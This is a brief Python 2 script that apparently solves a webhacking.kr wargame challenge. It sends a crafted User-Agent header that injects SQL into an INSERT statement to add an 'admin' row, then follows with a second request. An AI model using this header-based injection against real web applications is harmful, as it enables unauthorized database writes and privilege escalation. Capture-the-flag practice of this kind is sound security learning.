#-*- coding: utf-8 -*-
import urllib2
import CookieConstants

challengeUrl = "http://webhacking.kr/challenge/web/web-08/"

httpRequest = urllib2.Request(challengeUrl)
httpRequest.add_header("User-Agent", "agent', 'ip', 'admin'), ('test")
httpRequest.add_header("Cookie", CookieConstants.sessionId)

httpResponse = urllib2.urlopen(httpRequest).read()
print httpResponse

httpRequest.add_header("User-Agent", "agent")
httpRequest.add_header("Cookie", CookieConstants.sessionId)
httpRequest.get_method = lambda: 'POST'

httpResponse = urllib2.urlopen(httpRequest).read()
print httpResponse
